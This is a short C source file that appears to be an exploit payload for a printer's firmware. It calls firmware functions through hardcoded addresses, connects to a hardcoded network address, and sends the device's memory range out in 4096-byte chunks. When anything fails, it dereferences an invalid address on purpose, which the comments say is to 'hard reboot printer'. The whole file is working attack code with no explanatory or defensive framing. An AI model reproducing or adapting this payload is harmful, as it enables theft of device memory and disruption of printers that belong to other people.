static int (*socket)(int domain, int type, int protocol) = (void*)(0x01e780c + 1);
static int (*send)(int sockfd, void *buf, int len, int flags) = (void*)(0x1e8e56 + 1);
static int (*connect)(int sockfd, void *addr, int addrlen) = (void*)(0x001e7a04 + 1);
static int (*close)(int sockfd) = (void*)(0x001e96d2 + 1);

struct sockaddr_in {
	short sin_family;
	short sin_port;
	int   sin_addr;
	char  unused[0x18];
};

#define COPY_SIZE 4096

void
_start(void) {
	struct sockaddr_in addr;

	addr.sin_family = 0x108;
	addr.sin_port   = 0x4511;
	addr.sin_addr   = 0x0201a8c0;

	int sock = socket(1, 1, 6);
	if(sock != -1) {
		if(connect(sock, &addr, sizeof(addr)) != -1) {
			for(int ii = 0x18000000; ii < 0x20000000; ii += COPY_SIZE) {
				if(send(sock, (char*)ii, COPY_SIZE, 0) != COPY_SIZE) {
					close(sock);

					// Crash to hard reboot printer
					*(volatile int*)0x40000000;
				}
			}
		} else {
			*(volatile int*)0x40000000;
		}
		
		close(sock);
	} else {
		// Crash to hard reboot printer
		*(volatile int*)0x40000000;
	}
}

